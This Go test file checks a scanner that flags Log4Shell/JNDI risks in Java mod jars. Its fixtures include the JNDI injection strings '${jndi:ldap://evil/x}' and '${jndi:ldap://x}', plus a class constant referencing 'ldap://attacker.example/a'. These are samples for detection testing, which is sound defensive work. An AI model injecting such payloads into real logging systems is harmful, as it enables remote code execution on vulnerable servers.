package main

// log4shell_test.go —— Log4Shell/JNDI 静态扫描用例：内存构造 zip / class，
// 覆盖 JndiLookup 类、配置里的 ${jndi:}、外联 JNDI 常量池、嵌套 jar、干净 Mod。

import "testing"

// 携带 JndiLookup.class：critical 阻断。
func TestLog4ShellJndiLookupClassBlocked(t *testing.T) {
	data := buildJarWithClasses(t, map[string][]byte{
		"org/apache/logging/log4j/core/lookup/JndiLookup.class": []byte("CAFEBABE"),
		"fabric.mod.json": []byte(`{"id":"x"}`),
	})
	rep, err := scanLog4ShellBytes(data)
	if err != nil {
		t.Fatalf("扫描不应报错: %v", err)
	}
	if !rep.Blocked() {
		t.Fatalf("携带 JndiLookup 应阻断，发现: %+v", rep.Findings)
	}
}

// 配置文件出现 ${jndi:}：critical。
func TestLog4ShellJndiLiteralInConfigBlocked(t *testing.T) {
	data := buildJarInMemory(t, map[string]string{
		"log4j2.xml": `<Configuration><Appender><Pattern>%d ${jndi:ldap://evil/x}</Pattern></Appender></Configuration>`,
	})
	rep, err := scanLog4ShellBytes(data)
	if err != nil {
		t.Fatalf("扫描不应报错: %v", err)
	}
	if !rep.Blocked() {
		t.Fatalf("配置含 ${jndi:} 应阻断，发现: %+v", rep.Findings)
	}
}

// 普通数据资源出现 ${jndi:}：只 warn，不阻断（避免误杀）。
func TestLog4ShellJndiLiteralInPlainTextWarn(t *testing.T) {
	data := buildJarInMemory(t, map[string]string{
		"notes.txt": "this is a PoC string ${jndi:ldap://x} in docs",
	})
	rep, err := scanLog4ShellBytes(data)
	if err != nil {
		t.Fatalf("扫描不应报错: %v", err)
	}
	if rep.Blocked() {
		t.Fatalf("纯文本里的 PoC 字符串不应阻断，发现: %+v", rep.Findings)
	}
	found := false
	for _, f := range rep.Findings {
		if f.Rule == "jndi-literal-resource" {
			found = true
		}
	}
	if !found {
		t.Fatalf("应记录 jndi-literal-resource warn，发现: %+v", rep.Findings)
	}
}

// 显式开启 message lookups：warn。
func TestLog4ShellMessageLookupEnabledWarn(t *testing.T) {
	data := buildJarInMemory(t, map[string]string{
		"log4j2.properties": "appender.console.layout.pattern=%m{lookups}\n",
	})
	rep, err := scanLog4ShellBytes(data)
	if err != nil {
		t.Fatalf("扫描不应报错: %v", err)
	}
	found := false
	for _, f := range rep.Findings {
		if f.Rule == "message-lookup-enabled" {
			found = true
		}
	}
	if !found {
		t.Fatalf("应记录 message-lookup-enabled，发现: %+v", rep.Findings)
	}
}

// class 常量池同时引用 InitialContext 与 ldap://：warn，去重只报一次。
func TestLog4ShellOutboundClassWarn(t *testing.T) {
	cls := buildClassBytes(
		"javax/naming/InitialContext",
		"ldap://attacker.example/a",
	)
	data := buildJarWithClasses(t, map[string][]byte{
		"com/a/A.class": cls,
		"com/a/B.class": cls,
	})
	rep, err := scanLog4ShellBytes(data)
	if err != nil {
		t.Fatalf("扫描不应报错: %v", err)
	}
	hits := 0
	for _, f := range rep.Findings {
		if f.Rule == "jndi-outbound-class" {
			hits++
		}
	}
	if hits != 1 {
		t.Fatalf("jndi-outbound-class 应去重为 1 条，实际 %d，发现: %+v", hits, rep.Findings)
	}
}

// 只有 InitialContext 没有远程子协议：不报外联。
func TestLog4ShellNamingWithoutUrlClean(t *testing.T) {
	cls := buildClassBytes("javax/naming/InitialContext", "some/normal/Class")
	data := buildJarWithClasses(t, map[string][]byte{
		"com/a/A.class": cls,
	})
	rep, err := scanLog4ShellBytes(data)
	if err != nil {
		t.Fatalf("扫描不应报错: %v", err)
	}
	for _, f := range rep.Findings {
		if f.Rule == "jndi-outbound-class" {
			t.Fatalf("仅命名上下文引用不应报外联，发现: %+v", rep.Findings)
		}
	}
}

// 嵌套 jar 内的 JndiLookup 也必须被递归发现并阻断。
func TestLog4ShellNestedJndiBlocked(t *testing.T) {
	inner := buildJarWithClasses(t, map[string][]byte{
		"org/apache/logging/log4j/core/lookup/JndiLookup.class": []byte("CAFEBABE"),
	})
	outer := buildJarWithClasses(t, map[string][]byte{
		"fabric.mod.json":     []byte(`{"id":"outer"}`),
		"META-INF/jars/x.jar": inner,
	})
	rep, err := scanLog4ShellBytes(outer)
	if err != nil {
		t.Fatalf("扫描不应报错: %v", err)
	}
	if !rep.Blocked() {
		t.Fatalf("嵌套 jar 内 JndiLookup 应阻断，发现: %+v", rep.Findings)
	}
}

// 损坏的嵌套 jar 不致命，干净 Mod 不阻断。
func TestLog4ShellCleanModNotBlocked(t *testing.T) {
	emptyJar := buildJarWithClasses(t, map[string][]byte{})
	data := buildJarWithClasses(t, map[string][]byte{
		"fabric.mod.json":       []byte(`{"id":"ok"}`),
		"com/a/Main.class":      []byte("CAFEBABE"),
		"META-INF/jars/dep.jar": emptyJar,
		"META-INF/MANIFEST.MF":  []byte("Manifest-Version: 1.0\r\n\r\n"),
	})
	rep, err := scanLog4ShellBytes(data)
	if err != nil {
		t.Fatalf("扫描不应报错: %v", err)
	}
	if rep.Blocked() {
		t.Fatalf("干净 Mod 不应阻断，发现: %+v", rep.Findings)
	}
}

// 非 zip 输入应返回错误而非 panic。
func TestLog4ShellInvalidZip(t *testing.T) {
	if _, err := scanLog4ShellBytes([]byte("not a zip")); err == nil {
		t.Fatal("非 zip 字节应返回错误")
	}
}
